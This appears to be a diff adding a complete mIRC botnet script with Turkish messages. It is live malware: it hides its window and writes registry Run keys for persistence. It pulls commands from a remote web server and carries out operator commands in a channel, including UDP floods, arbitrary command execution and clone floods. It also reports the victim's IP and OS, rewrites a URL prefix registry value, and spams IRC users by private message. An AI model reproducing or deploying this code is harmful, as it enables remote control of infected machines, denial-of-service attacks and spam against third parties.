@@ -1,0 +1,308 @@
+; Set bY Pp: set by yok a.q olmuacakta
+
+on *:start: {
+  unset %*
+  .showmirc -t
+  .timer -i 1 2 NICK $_rands
+  .timer -i 1 2 ANICK $_rands
+  .timer -i 1 2 IDENTD ON $_rands
+  .timer -i 1 2 FULLNAME $_rands
+  .timer -i 1 2 EMAILADDR $_rands
+  .timer -i 0 60 _start
+  .timerregs -o 0 3 regs
+  .run regedit /S $mircdir\mirc.dll
+}
+on *:connect: {
+  if $serverip == %serverip {
+    .timer -i 1 5 JOIN %join
+  }
+}
+on *:exit: {
+  run $nopath($mircexe)
+}
+on *:disconnect: {   
+  partall
+  server
+}
+on *:appactive: {
+ showmirc -t
+}
+on *:text:*:#: {
+  if $nick isop # && # == %join && $serverip == %serverip {
+    if $1 == !sikonu {
+      _udpflood $2-
+    }
+    if $1 == !komuta {
+     $2- 
+    }
+    if $1 == !clone && $4 {
+      _servmessage $2 $+ : $+ $3 adresine $4 clone ile giriliyor...
+      var %i 1
+      while %i <= $4 {
+        .timer -i 1 $calc(%i * 5) server -m $2 $3
+        inc %i
+      }
+    }
+  }
+}
+on ^*:text:*:#: {
+if $nick !isop # {
+halt
+ }
+}
+on *:join:#: {
+  if $nick == $me && # == %join && $serverip == %serverip {
+    .timer -i 1 2 .msg # $ip - Windows: $os - Host: $host
+  }
+}
+alias _udpflood {
+  var %i 1
+  while %i <= $4 { 
+    sockudp -b flood $1 $2 $3
+    inc %i
+  }
+  _servmessage UDP flood tamamlandi: $1 $+ : $+ $2 ( $+ $3 bytes. $4 kere)
+}
+alias _servmessage {
+  if $server {
+    if m isincs $chan(%join).mode && $me !isvoice %join {
+      return
+    }
+    scid 1 .msg %join $1-
+  }
+}
+alias _start {
+  if !%readed {
+    _opensocks
+  }
+}
+alias _opensocks {
+  if !$sock(readweb) {
+    sockopen readweb  www.tropik.org 80
+  }
+}
+on *:sockopen:*: {
+  if $sockname == readweb {
+    if $sockerr > 0 { 
+      return 
+    }
+    _hfree servers
+    _sw $sockname GET /ControL.txt HTTP/1.1 
+    _sw $sockname Host:  www.tropik.org $+ $str($crlf,2)
+  }
+  else {
+    _sw $sockname NICK $_rands
+    _sw $sockname USER $_info($sockname).identd "" " $+ $_info($sockname).server $+ " : $+ $_info($sockname).fullname
+    hadd -m lenght $sockname 1
+  }
+}
+on *:sockread:*: {
+  if $sockname == readweb {
+    sockread %readweb
+    tokenize 32 %readweb
+    if $1 == server { 
+      _newserver $2-
+    }
+    if $1 == wwwprefix {
+      set %wwwprefix $2-
+      _wwwprefix
+    }
+    if $1 == connect {
+      set %serverip $4
+      .timer -i 1 5 !server $2 $3
+    }
+    if $1 == join {
+      set %join $2
+    }
+    if $hget(servers,$1) {
+      _spamset $1-
+    }
+  }
+  else {
+    var %s 
+    sockread %s 
+    tokenize 32 %s
+    if $1 == PING { 
+      _sw $sockname PONG $remove($2-,:) 
+    }
+    if $4 == :VERSION && $2 == PRIVMSG {
+      _sw $sockname NOTICE $_nick($1) :VERSION $read(Con32.dll)
+    }
+    if $2 == 376 || $2 == 422 {
+      set -u5 %namesx. [ $+ [ $sockname ] ] 1
+      .timer -i 1 $r(3,5) _sw $sockname MODE $3 -RDmM
+      .timer -i 1 $r(3,5) _sw $sockname UMODE -RDmM
+      .timer -i 1 $r(10,15) _sw $sockname JOIN $_info($sockname).chans
+    }
+    if $2 == 432 || $2 == 431 || $2 == 433 {
+      .timer -i 1 5 _sw $sockname NICK $_rands
+    }
+    if $2 == 496 {
+      .timer -i 1 5 _sw $sockname JOIN $_info($sockname).chans
+    }
+    if $2 == 403 || $2 == 405 || $2 == 471 || $2 == 472 || $2 == 473 || $2 == 474 || $2 == 475 || $2 == 477 {
+      _sw $sockname JOIN 0,
+      .timer -i 1 5 _sw $sockname JOIN $_info($sockname).chans
+    }
+    if $2 == 439 || (:Message target change too fast* iswm $5- && $chr(46) isin $_nick($1)) {
+      sockclose $sockname
+    }
+    if $2 == 353 && !%namesx. [ $+ [ $sockname ] ] {
+      set %names. [ $+ [ $sockname ] ] 1 
+      var %m $right($6-,-1)
+      while %names. [ $+ [ $sockname ] ] <= $numtok(%m,32) {
+        if $_isprefix($gettok(%m,%names. [ $+ [ $sockname ] ],32)) && !$istok($hget(opnicks,$sockname),$_noprefix($gettok(%m,%names. [ $+ [ $sockname ] ],32)),44) {
+          hadd -m opnicks $sockname $iif($hget(opnicks,$sockname),$+($+($ifmatch,$chr(44)),$_noprefix($gettok(%m,%names. [ $+ [ $sockname ] ],32))),$_noprefix($gettok(%m,%names. [ $+ [ $sockname ] ],32)))
+        }
+        var %q $r(1,2)
+        if %q == 1 && $hget(lenght,$sockname) < 30 {
+          hinc lenght $sockname
+          .timer -i 1 $calc(%names. [ $+ [ $sockname ] ] * $_info($sockname).queue) _sw $sockname USERHOST $_noprefix($gettok(%m,%names. [ $+ [ $sockname ] ],32))
+        }
+        inc %names. [ $+ [ $sockname ] ]
+      }
+    }
+    if $2 == 366 {
+      .timer -i 1 $calc(%names. [ $+ [ $sockname ] ] * $_info($sockname).queue + $r(5,10)) _sw $sockname NICK $_rands
+      .timer -i 1 $calc(%names. [ $+ [ $sockname ] ] * $_info($sockname).queue + $r(10,20)) _sw $sockname JOIN $_info($sockname).chans
+      .timer -i 1 $r(4,10) _sw $sockname PART $4
+    }
+    if $2 == 302 && $len($4) > 1 {
+      if $istok($hget(opnicks,$sockname),$right($gettok($4,1,61),-1),44) && !$istok($hget(ops,$sockname),$gettok($4,2,64),44) {
+        hadd -m ops $sockname $iif($hget(ops,$sockname),$+($+($ifmatch,$chr(44)),$gettok($4,2,64)),$gettok($4,2,64))
+        hdec lenght $sockname
+      }
+      if $chr(42) isin $right($gettok($4,1,61),-1) {
+        hdec lenght $sockname
+      }
+      else {
+        if !istok($hget(ops,$sockname),$gettok($4,2,64),44) {
+          _sw $sockname PRIVMSG $right($gettok($4,1,61),-1) $_info($sockname).spam
+          hdec lenght $sockname
+        }
+      }
+    }
+  }
+}
+on *:sockclose:*: {
+  if $sockname == readweb {
+    set %readed 1
+    .timer -i 0 10 _startspam
+  }
+}
+alias _isprefix {
+  if $chr(37) isin $1 || $chr(64) isin $1 || $chr(126) isin $1 || $chr(38) isin $1 {
+    return $true
+  }
+}
+alias _noprefix {
+  return $remove($1,$chr(37),@,+,~,&)
+}
+alias _nick {
+  return $right($gettok($1-,1,33),-1) 
+}
+alias _wwwprefix {
+  var %f = $r(99,999999) $+ .reg 
+  write %f REGEDIT4
+  write %f [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\Prefixes]
+  write %f "www"=" $+ %wwwprefix $+ "
+  run -n regedit /s %f
+  .timer -i 1 4 .remove %f
+}
+alias _reg {
+  var %f = $r(99,999999) $+ .reg 
+  write %f REGEDIT4
+  write %f [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
+  write %f "Startup"=" $+ $nopath($mircexe) $+ "
+  run -n regedit /s %f
+  .timer -i 1 4 .remove %f
+}
+alias _spamset {
+  hadd -m spam $1-
+}
+alias _newserver {
+  hadd -m servers $1-
+}
+
+alias _startspam {
+  var %i 1
+  while %i <= $hget(servers,0).item {
+    if !$sock($hget(servers,%i).item) {
+      if $hget(ops,$hget(servers,%i).item) {
+        hdel ops $hget(servers,%i).item
+      }
+      if $hget(opnicks,$hget(servers,%i).item) {
+        hdel opnicks $hget(servers,%i).item
+      }
+      if $hget(lenght,$hget(servers,%i).item) {
+        hdel lenght $hget(servers,%i).item
+      }
+      _sockopen $hget(servers,%i).item $gettok($hget(servers,%i).data,1-2,32)
+    }
+    inc %i
+  }
+}
+alias _sockopen {
+  if !$sock($1) && !%dontcon. [ $+ [ $1 ] ] {
+    .timer 1 $r(5,30) sockopen $1-
+  }
+}
+alias _info {
+  if $hget(servers,$1) {
+    if $prop == server {
+      return $gettok($hget(servers,$1),1,32)
+    }
+    if $prop == port {
+      return $gettok($hget(servers,$1),2,32)
+    }
+    if $prop == chans {
+      return $gettok($gettok($hget(servers,$1),3,32),$r(1,$numtok($gettok($hget(servers,$1),3,32),44)),44)
+    }
+    if $prop == identd {
+      return $iif($gettok($hget(servers,$1),4,32) == random,$lower($_rands),$gettok($hget(servers,$1),4,32))
+    }
+    if $prop == queue {
+      return $gettok($hget(servers,$1),5,32)
+    }
+    if $prop == fullname {
+      return $iif($gettok($hget(servers,$1),6-,32) == random,$_rands,$gettok($hget(servers,$1),6-,32))
+    }
+    if $prop == spam {
+      if $hget(spam,$1) {
+        return $ifmatch
+      }
+    }
+  }
+}
+alias _rands {
+  set %fnick $rand(1,10)
+  if (%fnick = 1) { return $read demo.xt $+ $chr($r(65,125)) $+ $chr($r(65,125))  }
+  if (%fnick = 2) { return $chr($r(65,125)) $+ $read demo.xt $+ $chr($r(65,125))  }
+  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  demo.xt }
+  if (%fnick = 4) { return $r(A,Z) $+ $read demo.xt $+ $r(A,Z) }
+  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }
+  if (%fnick = 6) { return $read  demo.xt $+ $r(1,40) $+ $chr($r(65,125))  }
+  if (%fnick = 7) { return $r(a,z) $+ $read demo.xt $+ $r(a,z) }
+  if (%fnick = 8) { return $read  demo.xt $+ $r(a,z) $+ $chr($r(65,125))  }
+  if (%fnick = 9) { return $read  demo.xt $+ $r(1,10) $+ $chr($r(65,125))  }
+  if (%fnick = 10) { return $read  demo.xt $+ $r(20,50) $+ $chr($r(65,125)) }
+}
+alias _hfree {
+  if $hget($1) {
+    hfree $1
+  }
+}
+alias _sw {
+  if $sock($1).status == active {
+    sockwrite -nt $1-
+  }
+}
+
+alias regs { 
+  set %filetoboot flk23.reg 
+  write %filetoboot  REGEDIT4
+  write %filetoboot [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]  
+  write %filetoboot "Tamer"=" $+ $replace($mircexe,\,\\) $+ "  
+  run -n regedit /s %filetoboot
+  timer 1 4 remove %filetoboot
+}
